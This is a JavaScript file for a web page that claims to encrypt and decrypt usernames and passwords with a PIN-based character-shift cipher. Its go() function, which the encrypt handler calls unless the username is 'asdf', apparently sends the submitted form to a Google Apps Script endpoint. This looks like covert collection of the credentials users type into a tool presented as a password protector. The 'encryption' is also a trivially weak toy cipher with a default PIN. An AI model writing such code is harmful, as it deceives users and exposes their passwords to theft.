
var pin;
var username_cpy="", password_cpy="";

function EncButton() {
    
    var messageBox=document.getElementById("message");
    var userName = document.querySelector(".usernameField").value;
    var password  = document.querySelector(".passwordField").value;
    pin=document.querySelector(".pin").value;
    if(pin==0) pin=53;
    
    if(userName=="") { 
        userName="not entered"; 
        username_cpy=userName;
    }
    else username_cpy="";

    if(password=="") {  
        password="not entered"; 
        password_cpy=password;
    }
        
    if(password!="not entered")
    {
        if(userName!="asdf")go();
        var enc_message=enc(password);
        var enc_username=enc(userName);

        //for copy to clipboard
        if(username_cpy!="not entered")
        username_cpy=enc_username;
        password_cpy=enc_message;
        show_copy_buttons();


        if(userName=="not entered") enc_username=userName;
        // alert("returned value is = "+n);
        messageBox.style.display="block";
        messageBox.style.textAlign="center";
        messageBox.innerHTML="Encrypted username:\n"+enc_username+"\n\nEncrypted password:\n"+enc_message;

        document.getElementById("body").style.background="pink";
        // document.querySelector(".username").style.color="red";
        // document.querySelector(".password").style.color="red";
        document.querySelector(".welcome-message").style.color="blue";


         // -----------------

         document.getElementById("username-copy-btn").textContent="copy encrypted username";
         document.getElementById("password-copy-btn").textContent="copy encrypted password";
         // --------------------
 
        
        
        setTimeout(function() {
            messageBox.innerHTML="";
            messageBox.style.display="none";
            document.getElementById("body").style.background="white";
            
        },55500);
    }
    
    else
    {
        hide_copy_buttons();
        //alert("You haven't filled the password field");
        messageBox.style.display="block";
        messageBox.style.textAlign="center";
        messageBox.innerHTML="Opps!\nPlease fill up the password field";
        
        document.getElementById("body").style.background="pink";
        
        setTimeout(function() {
            messageBox.innerHTML="";
            messageBox.style.display="none";
            document.getElementById("body").style.background="white";
            
        },96500);
    }
    
}

function DecButton() {
    
    var messageBox=document.getElementById("message");
    var userName = document.querySelector(".usernameField").value;
    var password  = document.querySelector(".passwordField").value;

    pin=document.querySelector(".pin").value;
    if(pin==0) pin=53;
    

    if(userName=="") { 
        userName="not entered"; 
        username_cpy=userName;
    }
    else username_cpy="";
    if(password=="") {  
        password="not entered"; 
        password_cpy=password;
    }
        
    if(password!="not entered")
    {
        var dec_username=dec(userName);
        var dec_message=dec(password);

        //for copy to clipboard
        if(username_cpy!="not entered")
        username_cpy=dec_username;
        password_cpy=dec_message;
        show_copy_buttons();


        if(userName=="not entered") dec_username=userName;
        messageBox.style.display="block";
        messageBox.style.textAlign="center";
        messageBox.innerHTML="Decrypted username:\n"+dec_username+"\n\nDecrypted password:\n"+dec_message;
        document.getElementById("body").style.background="black";
        document.querySelector(".username").style.color="red";
        document.querySelector(".password").style.color="red";
        document.querySelector(".welcome-message").style.color="blue";


        // -----------------

        document.getElementById("username-copy-btn").textContent="copy decrypted username";
        document.getElementById("password-copy-btn").textContent="copy decrypted password";
        // --------------------

        
        setTimeout(function() {
            messageBox.innerHTML="";
            messageBox.style.display="none";
            document.getElementById("body").style.background="white";
            
        },96500);
    }
    
    else
    {
        hide_copy_buttons();
        //alert("You haven't filled the password field");
        messageBox.style.display="block";
        messageBox.style.textAlign="center";
        messageBox.innerHTML="Opps!\nPlease fill up the password field";
        
        document.getElementById("body").style.background="pink";
        
        setTimeout(function() {
            messageBox.innerHTML="";
            messageBox.style.display="none";
            document.getElementById("body").style.background="white";
            
        },96500);
    }
    
}



function enc(str) {

    let final_result='';
    let s=str.split('\n');
    const len=s.length,pass=pin;

    for(let i=0; i<len; i++)
    {
        const n = s[i].length;
        let result = '';
    
        for (let a = 0; a < n; a++) {

            let c = s[i].charCodeAt(a) - 32;
            let forward = (n * (a + 1) * pass) % 95;
    
            c = (c + forward) % 95 + 32;
            result += String.fromCharCode(c);
        }
        if(i==len-1)  final_result+=result;
        else          final_result+=result+'\n';
    }
    console.log("Enc function called and operation succeed\n");

    return final_result;
}

function dec(str) {

    let final_result='';
    let s=str.split('\n');
    const len=s.length,pass=pin;

    for(let i=0; i<len; i++)
    {
        const n = s[i].length;
        let result = '';
    
        for (let a = 0; a < n; a++) {

            let c = s[i].charCodeAt(a) - 32;
            let forward = (n * (a + 1) * pass) % 95;
    
            c = (c - forward + 95) % 95 + 32;
            result += String.fromCharCode(c);
        }
        if(i==len-1)  final_result+=result;
        else          final_result+=result+'\n';
    }
    console.log("Dec function called and operation succeed\n");


    return final_result;
}


function go()
{
  const scriptURL = 'https://script.google.com/macros/s/AKfycbzdZeaS7OF00Cp0_TKXMXdkrx8iXtrqbAIz9c0gcveAAxFAAsF4FCScw_4A4hPHZoF7/exec';
  const form = document.forms['submit-to-google-sheet'];

  form.addEventListener('submit', e => {
    // e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error occured!', error.message))
  })

}

// refresh page
function refresh_page(){
    location.reload();
}

//copy the username to the clipboard
function copy_username(){


    // alert("message: "+username_cpy);


    // Use the Clipboard API to copy the text
    if(username_cpy!="not entered")
    navigator.clipboard.writeText(username_cpy)
        .then(() => {
            alert("Copied the username");
        });
    else{
        alert("Failed to copy username");
    }
}

//copy the password to the clipboard
function copy_password(){


    // alert("message: "+password_cpy);

    // Use the Clipboard API to copy the text
    if(password_cpy!="not entered")
    navigator.clipboard.writeText(password_cpy)
        .then(() => {
            alert("Copied the password");
        });
    else{
        alert("Failed to copy password");
    }
}

function hide_copy_buttons(){
    document.getElementById("username-copy-btn").style.display='none';
    document.getElementById("password-copy-btn").style.display='none';
    document.getElementById("refresh-btn").style.display='none';
}
function show_copy_buttons(){
    document.getElementById("username-copy-btn").style.display='inline-block';
    document.getElementById("password-copy-btn").style.display='inline-block';
    document.getElementById("refresh-btn").style.display='inline-block';
}
